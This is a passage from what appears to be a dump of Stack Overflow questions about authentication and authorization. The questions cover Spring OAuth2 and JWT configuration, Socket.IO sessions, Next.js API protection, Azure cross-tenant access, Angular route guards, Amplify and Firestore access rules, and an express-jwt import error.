    &lt;description&gt;my authentication Service&lt;/description&gt;
    &lt;properties&gt;
        &lt;java.version&gt;11&lt;/java.version&gt;
        &lt;spring-cloud.version&gt;Hoxton.SR1&lt;/spring-cloud.version&gt;
    &lt;/properties&gt;
    &lt;dependencies&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
            &lt;artifactId&gt;spring-boot-starter-data-jpa&lt;/artifactId&gt;
        &lt;/dependency&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
            &lt;artifactId&gt;spring-boot-starter-data-rest&lt;/artifactId&gt;
        &lt;/dependency&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
            &lt;artifactId&gt;spring-boot-starter-security&lt;/artifactId&gt;
        &lt;/dependency&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;
            &lt;artifactId&gt;spring-cloud-starter-oauth2&lt;/artifactId&gt;
        &lt;/dependency&gt;


    &lt;/dependencies&gt;

    &lt;dependencyManagement&gt;
        &lt;dependencies&gt;
            &lt;dependency&gt;
                &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;
                &lt;artifactId&gt;spring-cloud-dependencies&lt;/artifactId&gt;
                &lt;version&gt;${spring-cloud.version}&lt;/version&gt;
                &lt;type&gt;pom&lt;/type&gt;
                &lt;scope&gt;import&lt;/scope&gt;
            &lt;/dependency&gt;
        &lt;/dependencies&gt;
    &lt;/dependencyManagement&gt;

    &lt;build&gt;
        &lt;plugins&gt;
            &lt;plugin&gt;
                &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
                &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt;
            &lt;/plugin&gt;
        &lt;/plugins&gt;
    &lt;/build&gt;

&lt;/project&gt;

@SpringBootApplication
@EnableResourceServer
@EnableDiscoveryClient
@EnableFeignClients
@EnableGlobalMethodSecurity(prePostEnabled = true)
public class MyAuthenticationServiceApplication {


    public static void main(String[] args) {
        SpringApplication.run(WellnessAuthenticationServiceApplication.class, args);
    }

}

@EnableAuthorizationServer
@Slf4j
@Configuration
@RequiredArgsConstructor
class AuthorizationServerConfig extends AuthorizationServerConfigurerAdapter {

    private final GeneralUtil generalUtil;

    private final AuthenticationManager authenticationManager;

    private final UserRepository userRepository;

    private final UserDetailsService userDetailsService;

    private final PasswordEncoder passwordEncoder;

    private final TokenStore tokenStore;

    @Value(&quot;${user.oauth.client}&quot;)
    private String client;

    @Value(&quot;${user.oauth.secret}&quot;)
    private String secret;

    @Bean
    public JwtAccessTokenConverter jwtAccessTokenConverter() {
        return new JwtAccessTokenConverter() {
            @Override
            public OAuth2AccessToken enhance(OAuth2AccessToken oAuth2AccessToken, OAuth2Authentication oAuth2Authentication) {
                userRepository.findById(((org.springframework.security.core.userdetails.User) oAuth2Authentication.getPrincipal()).getUsername())
                        .ifPresent(user -&gt;
                                ((DefaultOAuth2AccessToken) oAuth2AccessToken).setAdditionalInformation(Map.of(
                                        &quot;firstName&quot;, user.getFirstName(),
                                        &quot;lastName&quot;, user.getLastName(),
                                        &quot;email&quot;, user.getEmail(),
                                        &quot;phoneNumber&quot;, user.getPhoneNumber(),
                                        &quot;configured&quot;, user.isConfigured())));

                return super.enhance(oAuth2AccessToken, oAuth2Authentication);
            }
        };
    }

    @Bean
    public WebResponseExceptionTranslator&lt;OAuth2Exception&gt; loggingExceptionTranslator() {
        return new DefaultWebResponseExceptionTranslator() {
            @Override
            public ResponseEntity&lt;OAuth2Exception&gt; translate(Exception e) throws Exception {
                return super.translate(e);
            }
        };
    }


    @Override
    public void configure(AuthorizationServerSecurityConfigurer security) throws Exception {
        security.checkTokenAccess(&quot;permitAll()&quot;);
    }

    @Override
    public void configure(ClientDetailsServiceConfigurer clients) throws Exception {
        clients.inMemory().withClient(client).secret(passwordEncoder.encode(secret)).authorizedGrantTypes(&quot;password&quot;, &quot;refresh_token&quot;).scopes(&quot;openid&quot;).accessTokenValiditySeconds(60000).refreshTokenValiditySeconds(60000);
    }

    @Override
    public void configure(AuthorizationServerEndpointsConfigurer endpoints) throws Exception {
        endpoints.authenticationManager(this.authenticationManager).accessTokenConverter(jwtAccessTokenConverter());
        endpoints.userDetailsService(userDetailsService);
        endpoints.exceptionTranslator(loggingExceptionTranslator());
        endpoints.tokenStore(this.tokenStore);
        endpoints.reuseRefreshTokens(false);
    }

}


</code></pre>
<p>Below is the code snippet of my resource server which is running on spring boot 3.2.1.</p>
<pre><code>&lt;?xml&gt;
    &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;
    &lt;parent&gt;
        &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
        &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt;
        &lt;version&gt;3.2.1&lt;/version&gt;
        &lt;relativePath /&gt; &lt;!-- lookup parent from repository --&gt;
    &lt;/parent&gt;
    &lt;groupId&gt;com.my&lt;/groupId&gt;
    &lt;artifactId&gt;my-dashboard-gateway&lt;/artifactId&gt;
    &lt;version&gt;0.0.1-SNAPSHOT&lt;/version&gt;
    &lt;name&gt;my-dashboard-gateway&lt;/name&gt;
    &lt;description&gt;my dashboard Gateway&lt;/description&gt;m
    &lt;properties&gt;
        &lt;java.version&gt;17&lt;/java.version&gt;
        &lt;spring-cloud.version&gt;2023.0.0&lt;/spring-cloud.version&gt;
    &lt;/properties&gt;
    &lt;dependencies&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;
            &lt;artifactId&gt;spring-cloud-starter-gateway&lt;/artifactId&gt;
        &lt;/dependency&gt;

        &lt;dependency&gt;
            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
            &lt;artifactId&gt;spring-boot-starter-security&lt;/artifactId&gt;
        &lt;/dependency&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
            &lt;artifactId&gt;spring-boot-starter-oauth2-resource-server&lt;/artifactId&gt;
        &lt;/dependency&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
            &lt;artifactId&gt;spring-boot-devtools&lt;/artifactId&gt;
            &lt;scope&gt;runtime&lt;/scope&gt;
            &lt;optional&gt;true&lt;/optional&gt;
        &lt;/dependency&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;org.projectlombok&lt;/groupId&gt;
            &lt;artifactId&gt;lombok&lt;/artifactId&gt;
            &lt;!--version&gt;1.18.30&lt;/version--&gt;
            &lt;optional&gt;true&lt;/optional&gt;
        &lt;/dependency&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
            &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt;
        &lt;/dependency&gt;

        &lt;dependency&gt;
            &lt;groupId&gt;org.apache.tomcat.embed&lt;/groupId&gt;
            &lt;artifactId&gt;tomcat-embed-core&lt;/artifactId&gt;
        &lt;/dependency&gt;
    &lt;/dependencies&gt;

    &lt;dependencyManagement&gt;
        &lt;dependencies&gt;
            &lt;dependency&gt;
                &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;
                &lt;artifactId&gt;spring-cloud-dependencies&lt;/artifactId&gt;
                &lt;version&gt;${spring-cloud.version}&lt;/version&gt;
                &lt;type&gt;pom&lt;/type&gt;
                &lt;scope&gt;import&lt;/scope&gt;
            &lt;/dependency&gt;
        &lt;/dependencies&gt;
    &lt;/dependencyManagement&gt;

    &lt;build&gt;
        &lt;plugins&gt;
            &lt;plugin&gt;
                &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
                &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt;
                &lt;configuration&gt;
                    &lt;excludes&gt;
                        &lt;exclude&gt;
                            &lt;groupId&gt;org.projectlombok&lt;/groupId&gt;
                            &lt;artifactId&gt;lombok&lt;/artifactId&gt;
                        &lt;/exclude&gt;
                    &lt;/excludes&gt;
                &lt;/configuration&gt;
            &lt;/plugin&gt;
        &lt;/plugins&gt;
    &lt;/build&gt;

&lt;/project&gt;


application.properties
spring.application.name=my-dashboard-gateway
server.port=7240
spring.security.oauth2.resourceserver.jwt.issuer-uri=http://localhost:7220

</code></pre>
<p>This is the endpoint that i am trying to access which is defined my-dashboard-gateway(resource server).</p>
<pre><code>@GetMapping(&quot;/companies&quot;)
public ResponseEntity&lt;String&gt; get() {
    return ResponseEntity.ok().body(&quot;Hello this is my company&quot;);
}
</code></pre>
<p>This is the exception occurred in on my resource server.</p>
<p><a href=""https://i.stack.imgur.com/meGpZ.png"" rel=""nofollow noreferrer"">exception</a></p>
<p>This is the exception occurred in authentication server.</p>
<p><a href=""https://i.stack.imgur.com/2sbo8.png"" rel=""nofollow noreferrer"">exception</a></p>
<p>Problem is Resource server is running on a new version and auth server is running on a old version.How do we validate the token coming to the resource server. what sort of configurations we need. Is there anything we have to do with following two end points</p>
<pre><code>spring.security.oauth2.resourceserver.jwt.issuer-uri
spring.security.oauth2.resourceserver.jwt.key-set-uri
</code></pre>
"
"<p>I use ReactJS and I try establish connection with NodeJS, and for http requests I use session based authentication. But once I try connect from client to server websocket I just can't access that cookie or find a way to check if it's user that connects.</p>
<p>tried printing whole socket.request and I didn't see any client cookies provided in there.</p>
<p>reactjs:</p>
<pre><code>setSocket(io(serverUrl));
</code></pre>
<p>nodejs:</p>
<pre><code>const configureSocketIO = (server: any): Server =&gt; {
console.log(&quot;io initialized&quot;)
const io = new Server(server, {
cors: {
    origin: 'http://localhost:3000', 
    methods: ['GET', 'POST'],
  },

});

io.engine.use(session({
secret: SERVER_SECRET as string,
resave: false,
saveUninitialized: true,
cookie: { secure: true }
}));

io.use((socket, next) =&gt; {

console.log(socket.request)
next();
});


return io;
};
</code></pre>
"
"<p>How to create JMeter script involving AWS SDK Calls.
We need to install AWS SDK, so we have done it using AWS Bundles and added it to the Lib folder of JMeter, here we want to get all the authorization parameters and tokens found in AWS.</p>
<p>We have tried installing of the packages</p>
"
"<p>I'm currently working on a Next.js application and I'm trying to secure the API routes. My goal is to ensure that only my frontend can access these routes, preventing any unauthorized clients from doing so. Note users do not have to be authenticated to use the app.</p>
<p>Over the past few days, I've been exploring various solutions, but I've encountered some challenges. While some of the methods I've tried have been somewhat successful, they've unfortunately resulted in a significant slowdown of the application.</p>
<p>One approach that seemed promising involved using Google reCAPTCHA. This method generates a public key on the client side and validates it on the server side. While it does work to some extent, it has the downside of making the application run three times slower than usual.</p>
"
"<p>I have an Azure Kubernetes Service (AKS) cluster hosted in one Azure AD tenant and an Azure Container Registry (ACR) hosted in another Azure AD tenant. The ACR is secured using a service principal, and the AKS cluster uses a managed identity. I need to configure the AKS cluster to pull container images from the ACR securely. What is the best approach to set up cross-tenant authentication and authorization between the AKS cluster and the ACR?</p>
<p>Here are the specific requirements and constraints:</p>
<ol>
<li>The ACR is located in Azure AD Tenant A, and the AKS cluster is hosted in Azure AD Tenant B.</li>
<li>A service principal exists in Tenant A, which is used to secure the ACR.</li>
<li>A managed identity exists in Tenant B, which is associated with the AKS cluster.</li>
<li>The AKS cluster needs to be configured to authenticate with the ACR using its managed identity.</li>
</ol>
<p>I've researched options like Azure RBAC, Azure AD B2B collaboration, and managed identities, but I'm unsure of the best approach to implement this configuration. Can someone provide guidance or a step-by-step solution to achieve this?</p>
<p>Any help or insights would be greatly appreciated. Thank you!</p>
<p>I've done some research, but i can't find any information if this is possible from a tenant in managed Identity and another with a Service principal.</p>
"
"<p>I have a case, where I need to get access token without http call to predefined by Oauth Spring Security <code>/oauth/token</code> endpoint, but instead, have a call for some api, available for the anonymous user, and among the other business data bring the access token back.</p>
<p>I try this code:</p>
<pre><code>        String username = &quot;username&quot;;
        String password = &quot;2134&quot;;
//
        AccountInitSetting accountSetting = accountService.getInitSetting(username);
        try {
            agentService.createTempCredentials(username, accountSetting.getAccountType(),
                    null, accountSetting.getRoleId(), accountSetting.getGroupId(),
                    ((ServletRequestAttributes) RequestContextHolder.getRequestAttributes()).getRequest().getHeader(&quot;x-forwarded-for&quot;),
                    null, false);
        } catch (UserInterfaceException e) {
            throw new RuntimeException(e);
        }


        Map&lt;String, String&gt; parameters = new HashMap&lt;&gt;();
        parameters.put(&quot;grant_type&quot;,&quot;password&quot;);
        parameters.put(&quot;username&quot;, username);
        parameters.put(&quot;password&quot;, password);
        parameters.put(&quot;scope&quot;,&quot;all&quot;);

        try {
            return tokenEndpoint.postAccessToken(principal, parameters).getBody().getValue();

        } catch (HttpRequestMethodNotSupportedException e) {
            throw new OAuth2Exception(e.getMessage(), e);
        }

    }
</code></pre>
<p>please note, that <code>Principal</code> is taken from the <code>@RestController</code>'s endpoint method paramether and thus passed to this method.</p>
<p>And I'm getting the below exception:</p>
<pre><code>22:40:33.007 [http-bio-9090-exec-2] ERROR com.openpayment.site.web.service.init.WebServiceExceptionHandler - There is no client authentication. Try adding an appropriate authentication filter.
org.springframework.security.authentication.InsufficientAuthenticationException: There is no client authentication. Try adding an appropriate authentication filter.
</code></pre>
<p>What I'm missing?</p>
"
"<p>I'm a newbie to spring security, I'm trying to create a JWT token with spring security. I have defined my successhandler function after the default form authentication of spring. The successhandler creates a jwt token and sends it as a response header. Now I want to land at my Index page how do I achieve it? How can I add the jwt as an authentication header and write a page redirection in the successhandler to my /UserIndex page? I'd also like to know we can redirect user to Admin Index or User Index based on roles in the success handler.
<code>This is my config code</code> @Configuration
@EnableWebSecurity
public class JWTSecurityConfig {</p>
<pre><code> @Bean
    public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
        http
            .csrf(csrf -&gt; csrf.disable())
            .authorizeRequests(authorize -&gt; authorize
                .requestMatchers(&quot;/SignIn*&quot;).permitAll()
                .requestMatchers(PathRequest.toStaticResources().atCommonLocations()).permitAll()
                .requestMatchers(PathRequest.toH2Console()).permitAll()
                .anyRequest().authenticated()
            )    
            .formLogin()
                .loginPage(&quot;/SignIn&quot;)
                .loginProcessingUrl(&quot;/Authenticate&quot;)
                .successHandler(appAuthenticationSuccessHandler())
                .permitAll()
            .and()
            .sessionManagement(session -&gt; session
                .sessionCreationPolicy(SessionCreationPolicy.STATELESS)
            )
            .headers(headers -&gt; headers.frameOptions().sameOrigin())
            .oauth2ResourceServer(OAuth2ResourceServerConfigurer::jwt);

        return http.build();
    }
 
 @Bean
    public AuthenticationSuccessHandler appAuthenticationSuccessHandler() {
        return new AppAuthenticationSuccessHandler();
    }
 
 public class AppAuthenticationSuccessHandler extends SimpleUrlAuthenticationSuccessHandler{
     @Autowired
        private JWTAuthentication jwtAuthenticationService;
     
     private static final Logger LOGGER = LoggerFactory.getLogger(AppAuthenticationSuccessHandler.class);
     @Override
       protected void handle(HttpServletRequest request, HttpServletResponse response,
       Authentication authentication) throws IOException, ServletException {
         JWTResponse jwtResponse = jwtAuthenticationService.authenticate(authentication);
         System.out.println(jwtResponse);
         Set&lt;String&gt; roles = authentication.getAuthorities().stream()
                    .map(GrantedAuthority::getAuthority)
                    .collect(Collectors.toSet());
         
         LOGGER.info(&quot;User roles: {}&quot;, roles);
         response.setContentType(&quot;application/json&quot;);
            response.setCharacterEncoding(&quot;UTF-8&quot;);
            response.setHeader(&quot;Authorization&quot;, &quot;Bearer &quot; + jwtResponse.Token());
        }
}
</code></pre>
<p><code>This is my web controller</code>@Controller
public class WebController {</p>
<pre><code>@GetMapping(&quot;/SignIn&quot;)
public String loginPage() {
    return &quot;LoginPage&quot;;
}

@GetMapping(&quot;/AdminIndex&quot;)
public String adminIndex() {
    return &quot;AdminIndex&quot;;
}

@GetMapping(&quot;/UserIndex&quot;)
public String userIndex() {
    return &quot;UserIndex&quot;;
}
</code></pre>
<p>}</p>
<p>I tried sending the user to /UserIndex using a redirect in the successhandler but I get redirected back to my login page</p>
"
"<p>I was following <a href=""https://github.com/spring-projects/spring-authorization-server/tree/main/samples"" rel=""nofollow noreferrer"">this Demo example</a> and was wondering why the Auth server config reads</p>
<pre><code>          redirect-uris:
            - &quot;http://127.0.0.1:1234/login/oauth2/code/my-webapp-client-oidc&quot;
            - &quot;http://127.0.0.1:1234/authorized&quot;
          post-logout-redirect-uris:
            - &quot;http://127.0.0.1:1234/logged-out&quot;
</code></pre>
<p>instead of</p>
<pre><code>          redirect-uris:
            - &quot;http://localhost:1234/login/oauth2/code/my-webapp-client-oidc&quot;
            - &quot;http://localhost:1234/authorized&quot;
          post-logout-redirect-uris:
            - &quot;http://localhost:1234/logged-out&quot;
</code></pre>
<p>I would assume that it makes no difference but it does. When changing the URIs to localhost, the auth server gives me an exception when trying to login:</p>
<pre><code>org.springframework.security.access.AccessDeniedException: Access Denied
    at org.springframework.security.web.access.intercept.AuthorizationFilter.doFilter(AuthorizationFilter.java:98) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:374) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.security.web.access.ExceptionTranslationFilter.doFilter(ExceptionTranslationFilter.java:126) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.security.web.access.ExceptionTranslationFilter.doFilter(ExceptionTranslationFilter.java:120) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:374) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.security.web.authentication.AnonymousAuthenticationFilter.doFilter(AnonymousAuthenticationFilter.java:100) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:374) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.security.web.servletapi.SecurityContextHolderAwareRequestFilter.doFilter(SecurityContextHolderAwareRequestFilter.java:179) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:374) ~[spring-security-web-6.2.1.jar:6.2.1]
    at...
</code></pre>
<p>Could you please explain that to me? Thank you.</p>
"
"<p>I'm developing an iOS app that uses ScreenTime API.</p>
<p>Locally, everything works as expected - I have two physical devices in one Apple Family, and calling <code>AuthorizationCenter.shared.requestAuthorization(for: .child)</code> shows standard authorization dialog.</p>
<p>Currently the app is in a review by Apple, and they are saying they can't authorize as a child. From logs, and a screenshots provided by them, I see that on <code>AuthorizationCenter.shared.requestAuthorization(for: .child)</code> call, <code>FamilyControlsError.restricted</code> error is thrown.</p>
<p>I didn't encounter this error once during development and can't simulate this issue now either. Tried everything - authorization on account that is not a child, not in a family, tried restricting everything possible for a child's device from ScreenTime settings. This specific error is never triggered.</p>
<p>Does anyone have idea why this error could happen? My last guess is the review team is using an enterprise account and that somehow intercepts with ScreenTime settings. But I don't have an enterprise account to test this theory.</p>
"
"<p>jwt.js:</p>
<pre><code>const expressJwt = require('express-jwt')

function authJwt() {
    const secret = process.env.secret
    return expressJwt({
        secret,
        algorithms: ['HS256']
    })
}

module.exports = authJwt
</code></pre>
<p>terminal:</p>
<pre><code>C:\code-wldn\final-project\wldn-api\helpers\jwt.js:5
return expressJwt({
       ^

TypeError: expressJwt is not a function
    at authJwt (C:\code-wldn\final-project\wldn-api\helpers\jwt.js:5:12)
    at Object.&lt;anonymous&gt; (C:\code-wldn\final-project\wldn-api\app.js:18:9)
</code></pre>
<p>I tried to resolve the error message</p>
<blockquote>
<p>TypeError: expressJwt is not a function</p>
</blockquote>
<p>by ensuring that express-jwt is properly imported and used as a function in the jwt.js file. I expected the error to be resolved, allowing the application to run without any issues related to expressJwt. However, the error persisted despite my attempts to address it.</p>
<p><a href=""https://i.stack.imgur.com/Mv2Sc.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/Mv2Sc.png"" alt=""enter image description here"" /></a></p>
"
"<p>I have a model called &quot;type User&quot; and a model &quot;type Group&quot;</p>
<pre><code>type User
  @model
  @auth(rules: [{ allow: owner }])
  {
    id: ID!
    name: String
    age: Int
    owner: ID!
  }
</code></pre>
<p>Here my group model:</p>
<pre><code>type Group
   @model
   @auth(rules: [{
        allow: owner
        ownerField: &quot;adminIds&quot;
        operations: [create, read, update]
      }
      { allow: owner, ownerField: &quot;userIds&quot;, operations: [create, read] }
      ])
    {
      userIds: []
      adminIds: []     
    }
</code></pre>
<p>Now how do i set up an authorization so that the the admin users are able to read the <code>User</code> even if they are not the owner?</p>
<p>From my point of knowledge the problem is if you want to use a lambda for authorization and want to fetch an user you can easy check if you are the owner, but you cannot check a other Table in this case <code>Group</code> because you dont have the information?</p>
"
"<p>my router is not working properly, when I go to the pageNotFound page and want to go back to previous steps, it redirects me to the login page, I would be grateful for any tips on how to fix it. Debuilding shows that the method in authenticationguard - canActive() returns false when returning from this page, unfortunately I cannot find out why the user is not read correctly</p>
<pre><code>export const routes: Routes = [
      {
        path: 'forbidden',
        component: ForbiddenPageComponent,
      },
      {
        path: 'auth',
        loadChildren: () =&gt; import('./modules/auth/auth.module').then(mod =&gt; mod.AuthModule),
        component: AuthComponent,
      },
     
      {
        path: '',
        canActivate: [AuthenticationGuard],
        canActivateChild: [AuthorizationGuard],
        children: [
          {
            path: 'task',
            loadChildren: () =&gt; import('./modules/task/task.module').then(mod =&gt; mod.TaskModule),
          },
          {
            path: 'order',
            loadChildren: () =&gt; import('./modules/order/order.module').then(mod =&gt; mod.OrderModule),
          },
          {
            path: '',
            pathMatch: 'full',
            redirectTo: 'task',
          }
        ],
      },
      {
        path: '**',
        pathMatch: 'full',
        component: PageNotFoundComponent
      }
    ];

@Injectable({
  providedIn: 'root',
})
export class AuthenticationGuard {
  currentUser: OPLUser | null;
 
  constructor(
    private authService: AuthService,
    private router: Router,
    @Inject(APP_CONFIG) private appConfig: AppEnvConfiguration
  ) {
    this.authService.currentUser$.subscribe(user =&gt; {
      this.currentUser = user;
    });
  }
 
  canActivate(): Observable&lt;boolean | UrlTree&gt; | Promise&lt;boolean | UrlTree&gt; | boolean | UrlTree {
    if (this.appConfig.skipLogin || (this.currentUser &amp;&amp; this.currentUser.isAuthenticated())) {
      return true;
    }
 
    this.router.navigate(['/auth'], { replaceUrl: true });
 
    return false;
  }
}

@Injectable({
  providedIn: 'root',
})
export class AuthorizationGuard {
  constructor(
    private authService: AuthService,
    private router: Router,
    @Inject(APP_CONFIG) private appConfig: AppEnvConfiguration
  ) {}
 
  /**
   * Checks if user is authorized to activate this route.
   * If not, user is redirected to 'forbidden' page.
   *
   * @param route
   */
  canActivateChild(
    route: ActivatedRouteSnapshot
  ): Observable&lt;boolean | UrlTree&gt; | Promise&lt;boolean | UrlTree&gt; | boolean | UrlTree {
    const currentUser = this.authService.currentUser$.getValue();
    if (currentUser &amp;&amp; currentUser.authenticatedAndAuthorized) {
      if (this.appConfig.skipLogin) return true;
 
      const routeRoleList: RouteRule = route &amp;&amp; route.data ? route.data['roleList'] : null;
 
      if (!routeRoleList || this.matchesRole(routeRoleList, currentUser)) {
        return true;
      } else {
        this.router.navigate(['forbidden'], { skipLocationChange: true });
        return false;
      }
    } else {
      this.router.navigate(['forbidden'], { skipLocationChange: true });
      return false;
    }
  }
 
  /**
   * Checks if user roles matches route role configuration.
   * OneOf - checks any role.
   * AllOf - checks all roles.
   *
   * @param routeRoleList - provided route role configuration.
   * @param user - current user.
   */
  matchesRole(routeRoleList: RouteRule, user: OPLUser | null): boolean {
    let match = true;
 
    if (routeRoleList.oneOf &amp;&amp; routeRoleList.oneOf.length &gt; 0) {
      match = routeRoleList.oneOf.some(role =&gt; user?.hasRole(role));
    }
 
    if (routeRoleList.allOf &amp;&amp; routeRoleList.allOf.length &gt; 0) {
      match = routeRoleList.oneOf.every(role =&gt; user?.hasRole(role));
    }
 
    return match;
  }
}
 
</code></pre>
"
"<p>I have a requirement where I want to return dynamic property based on user role from REST API.</p>
<p>for eg. a rest API return a Student object and it has 10 properties like firstName, lastName etc.</p>
<p>if the Student role user calls then it should return only 5 property
if the Teacher role user calls then it should return only 8 property
if the Admin   role user calls then it should return all  10 property</p>
<p>I am using spring boot
I have explored GraphQL, and spring boot ACL  but projection is not provided.</p>
<p>My question is do I need to write a functionality using java reflection which will intercept the outgoing call and remove the other property?</p>
<p>Is there any library exist which does this job</p>
<p>any other way than reflection I  can use?</p>
"
"<p>I am trying to build a rbac where i have Users, Organization, Collection1, Collection2 where the users have roles like &quot;admin&quot;,&quot;expert&quot;,&quot;noob&quot;. an admin can give &quot;expert&quot; level access and an &quot;expert&quot; can give &quot;nood&quot; level access to users.
Admin can write,read Organization, Collection1</p>
<p>Expert can read all and updated some fields in Collection1 and  (Read the docs guess i need to store these fields in a separate SubCollection).
Noob can only read some fields in the assigned Doc from Collection1 and Collection2 but cannot edit anything.
By far i have accomplished this by creating SubCollection /OrganizationAccess /Collection1 /Collection2 where i create doc by uid and writing rules like
<code>// Access to OrganizationAccess collection group match /{cpath=**}/OrganizationAccess/{accessId} { allow read: if request.auth != null; }</code>
same for Collection1 and Collection2
All seems good... but what if i want to query or paginate OrganizationAccess,Collection1,Collection2
i cannot simply because that is not how firebase works i believe, This makes me question this approach. Please let me know if this needs modification or recommend a robust structure that has less data duplication and uses less get() calls in firebase rules. This question might be incomplete but i would appreciate if we all settle this once in for all.</p>
"
"<p><strong>I tried the following thing to achieve my application use case.</strong></p>
<p><strong>Usecase:</strong></p>
<ul>
<li>It is ok for Access Token to expire immediately after the identity has been asserted – the user continues to access the resource based on the component’s session lifecycle configuration.</li>
<li>when the new request comes with the access_token, spring security doing token validation(As Default).</li>
<li>after the validated token, user details &amp; other information are stored inside a tomcat in-memory session.</li>
<li>when any request comes next time with the JSESSIONID &amp; access_token spring security will check if a valid Session exists in memory, if yes do not use the access_token for this request, else go for the access_token validation.</li>
</ul>
<p><strong>Why I am doing this?</strong></p>
<ul>
<li>I don't want to validate the token on every request(for optimization), because the same user has validated at the first, and auth details are stored inside the session.</li>
</ul>
<p><strong>My Question Is:</strong></p>
<ol>
<li>Is it good to store the access_token details inside the session and use the token information from the session if access_token expires?</li>
<li>what does spring security suggest for this use case or any good way to do it?</li>
</ol>
<p><strong>Resouce Server Implementation Details:</strong></p>
<ul>
<li>Spring Security Adapter:</li>
</ul>
<pre><code>package org.cfx.resouce.server;

import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.security.config.annotation.web.builders.HttpSecurity;
import org.springframework.security.config.http.SessionCreationPolicy;
import org.springframework.security.oauth2.jwt.JwtDecoder;
import org.springframework.security.oauth2.jwt.JwtDecoders;
import org.springframework.security.oauth2.server.resource.authentication.JwtAuthenticationConverter;
import org.springframework.security.oauth2.server.resource.authentication.JwtGrantedAuthoritiesConverter;
import org.springframework.security.oauth2.server.resource.web.BearerTokenAuthenticationFilter;
import org.springframework.security.web.SecurityFilterChain;

@Configuration
public class ResouceServerAdapter {
    

    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {

        http.addFilterBefore(new CookieAuthenticationFilter(), BearerTokenAuthenticationFilter.class);
        http.addFilterAfter(new SecurityContextHolderSetterAfterAccessTokenValidation(), BearerTokenAuthenticationFilter.class);

        http.sessionManagement().sessionCreationPolicy(SessionCreationPolicy.IF_REQUIRED).and().csrf().disable();

        http.authorizeRequests().antMatchers(&quot;/msg&quot;).authenticated()
                .antMatchers(&quot;/test&quot;).permitAll().anyRequest().denyAll().and().oauth2ResourceServer().jwt()
                .jwtAuthenticationConverter(jwtAuthenticationConverter());

        return http.build();
    }

    @Bean
    public JwtDecoder jwtDecoder() {
        return JwtDecoders.fromIssuerLocation(&quot;http://host:port/openam/oauth2/Test&quot;);
    }

    @Bean
    public JwtAuthenticationConverter jwtAuthenticationConverter() {
        JwtGrantedAuthoritiesConverter converter = new JwtGrantedAuthoritiesConverter();
        converter.setAuthoritiesClaimName(&quot;groups&quot;);
        converter.setAuthorityPrefix(&quot;ROLE_&quot;);

        JwtAuthenticationConverter jwtAuthenticationConverter = new JwtAuthenticationConverter();
        jwtAuthenticationConverter.setJwtGrantedAuthoritiesConverter(converter);
        return jwtAuthenticationConverter;
    }
}
</code></pre>
<ul>
<li>Custom filter implementation:</li>
</ul>
<pre><code>package org.cfx.resouce.server;

import java.io.IOException;

import javax.servlet.FilterChain;
import javax.servlet.ServletException;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletRequestWrapper;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;

import org.apache.commons.lang3.tuple.ImmutablePair;
import org.springframework.http.HttpHeaders;
import org.springframework.security.core.Authentication;
import org.springframework.security.core.context.SecurityContext;
import org.springframework.security.core.context.SecurityContextHolder;
import org.springframework.web.filter.OncePerRequestFilter;

public class CookieAuthenticationFilter extends OncePerRequestFilter {

    @Override
    protected void doFilterInternal(HttpServletRequest request, HttpServletResponse response, FilterChain filterChain)
            throws ServletException, IOException {

        ImmutablePair&lt;String, String&gt; resolvedHeaders = Utils.resolveHeaders(request);
        //String accessToken = resolvedHeaders.left;
        String cookieValue = resolvedHeaders.right; //BFAA1E95A63DA333CDBFACE6786FCC26


        // if cookie present then need to check inside session
        if (cookieValue != null) {
            System.out.println(&quot;Cookie Value Found Inside Header........&quot;);
            HttpSession session = request.getSession(false);
            String sessionId = session != null ? session.getId() : null;
            System.out.println(&quot;------Session Found with ID: --------: &quot; + sessionId);
            System.out.println(&quot;Session :: &quot;
                    + (session != null ? session.getAttribute(&quot;SPRING_SECURITY_CONTEXT&quot;) : null));

            if (session != null &amp;&amp; session.getAttribute(&quot;SPRING_SECURITY_CONTEXT&quot;) != null) {
